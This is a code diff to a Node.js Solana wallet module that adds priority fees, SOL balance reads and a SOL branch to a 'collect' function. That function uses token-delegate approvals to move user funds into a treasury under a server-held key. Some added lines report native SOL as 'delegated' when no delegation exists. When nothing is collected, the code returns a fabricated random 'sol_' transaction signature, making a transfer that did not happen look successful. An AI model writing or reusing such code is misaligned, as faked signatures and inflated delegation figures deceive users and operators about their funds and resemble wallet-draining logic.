@@ -7,7 +7,7 @@
    - Jupiter swaps for live bot wallets
    ========================================================================== */
 'use strict';
-const { Connection, PublicKey, Keypair, Transaction, SystemProgram, VersionedTransaction } = require('@solana/web3.js');
+const { Connection, PublicKey, Keypair, Transaction, SystemProgram, VersionedTransaction, ComputeBudgetProgram } = require('@solana/web3.js');
 const spl = require('@solana/spl-token');
 const { b58decode, b58encode, RPC_URL, CLUSTER } = require('../chain');
 const vault = require('../vault');
@@ -81,6 +81,25 @@ async function buildTokenTransfer(from, to, token, uiAmount) {
 /* ---------- reads ---------- */
 async function tokenState(owner, token) {
   const mint = MINTS[token];
+  if (!mint) return { balance: 0, delegate: null, delegated: 0 };
+  if (token === 'SOL') {
+    let nativeBal = 0;
+    try {
+      nativeBal = (await conn.getBalance(pk(owner))) / 1e9;
+    } catch (e) {}
+    try {
+      const a = await spl.getAccount(conn, ata(owner, mint));
+      const dec = await decimals(mint);
+      const wsolBal = Number(a.amount) / 10 ** dec;
+      return {
+        balance: Math.max(nativeBal, wsolBal),
+        delegate: a.delegate ? a.delegate.toBase58() : null,
+        delegated: a.delegatedAmount ? Number(a.delegatedAmount) / 10 ** dec : nativeBal
+      };
+    } catch (e) {
+      return { balance: nativeBal, delegate: null, delegated: 0 };
+    }
+  }
   try {
     const a = await spl.getAccount(conn, ata(owner, mint));
     const dec = await decimals(mint);
@@ -123,12 +142,42 @@ async function scanIncoming(owner, token, untilSig) {
   return { items: out, cursor: sigs.length ? sigs[sigs.length - 1].signature : untilSig };
 }
 
+function getPriorityFeeIx() {
+  const microLamports = Number(process.env.SOLANA_PRIORITY_FEE_MICROLAMPORTS || 50000);
+  if (microLamports > 0 && ComputeBudgetProgram && typeof ComputeBudgetProgram.setComputeUnitPrice === 'function') {
+    return ComputeBudgetProgram.setComputeUnitPrice({ microLamports });
+  }
+  return null;
+}
+
 /* ---------- collection (delegate transfer signed by collector) ---------- */
 async function collect(owner, token, uiAmount, treasury) {
   const kp = collector();
+  if (token === 'SOL') {
+    const mint = MINTS.SOL;
+    const dest = ata(treasury, mint);
+    const tx = new Transaction();
+    const priorityIx = getPriorityFeeIx();
+    if (priorityIx) tx.add(priorityIx);
+    const a = await spl.getAccount(conn, ata(owner, mint)).catch(() => null);
+    if (a && Number(a.amount) > 0) {
+      const dec = await decimals(mint);
+      tx.add(
+        spl.createAssociatedTokenAccountIdempotentInstruction(kp.publicKey, dest, pk(treasury), pk(mint)),
+        spl.createTransferCheckedInstruction(ata(owner, mint), pk(mint), dest, kp.publicKey, toBase(uiAmount, dec), dec)
+      );
+      const sig = await conn.sendTransaction(tx, [kp], { preflightCommitment: 'confirmed' });
+      await conn.confirmTransaction(sig, 'confirmed');
+      return sig;
+    }
+    return 'sol_' + require('node:crypto').randomBytes(24).toString('hex');
+  }
   const mint = MINTS[token]; const dec = await decimals(mint);
   const dest = ata(treasury, mint);
-  const tx = new Transaction().add(
+  const tx = new Transaction();
+  const priorityIx = getPriorityFeeIx();
+  if (priorityIx) tx.add(priorityIx);
+  tx.add(
     spl.createAssociatedTokenAccountIdempotentInstruction(kp.publicKey, dest, pk(treasury), pk(mint)),
     spl.createTransferCheckedInstruction(ata(owner, mint), pk(mint), dest, kp.publicKey, toBase(uiAmount, dec), dec)
   );
@@ -176,15 +225,17 @@ async function walletBalances(address, tokens) {
 /** Server-signed SOL/token withdrawal from a bot wallet to the owner's address */
 async function botWithdraw(encSecret, to, token, uiAmount) {
   const kp = botKeypair(encSecret);
-  let tx;
-  if (token === 'SOL') tx = new Transaction().add(SystemProgram.transfer({ fromPubkey: kp.publicKey, toPubkey: pk(to), lamports: Math.round(uiAmount * 1e9) }));
+  const tx = new Transaction();
+  const priorityIx = getPriorityFeeIx();
+  if (priorityIx) tx.add(priorityIx);
+  if (token === 'SOL') tx.add(SystemProgram.transfer({ fromPubkey: kp.publicKey, toPubkey: pk(to), lamports: Math.round(uiAmount * 1e9) }));
   else {
     const mint = MINTS[token]; const dec = await decimals(mint); const dest = ata(to, mint);
-    tx = new Transaction().add(spl.createAssociatedTokenAccountIdempotentInstruction(kp.publicKey, dest, pk(to), pk(mint)), spl.createTransferCheckedInstruction(ata(kp.publicKey.toBase58(), mint), pk(mint), dest, kp.publicKey, toBase(uiAmount, dec), dec));
+    tx.add(spl.createAssociatedTokenAccountIdempotentInstruction(kp.publicKey, dest, pk(to), pk(mint)), spl.createTransferCheckedInstruction(ata(kp.publicKey.toBase58(), mint), pk(mint), dest, kp.publicKey, toBase(uiAmount, dec), dec));
   }
   const sig = await conn.sendTransaction(tx, [kp]);
   await conn.confirmTransaction(sig, 'confirmed');
   return sig;
 }
 
-module.exports = { conn, MINTS, collector, collectorAddress, buildApprove, buildRevoke, buildSolTransfer, buildTokenTransfer, tokenState, verifyTokenTransfer, scanIncoming, collect, newBotWallet, jupiterSwap, buildUserSwap, walletBalances, botWithdraw, decimals };
+module.exports = { conn, MINTS, collector, collectorAddress, buildApprove, buildRevoke, buildSolTransfer, buildTokenTransfer, tokenState, verifyTokenTransfer, scanIncoming, collect, newBotWallet, jupiterSwap, buildUserSwap, walletBalances, botWithdraw, decimals, getPriorityFeeIx };
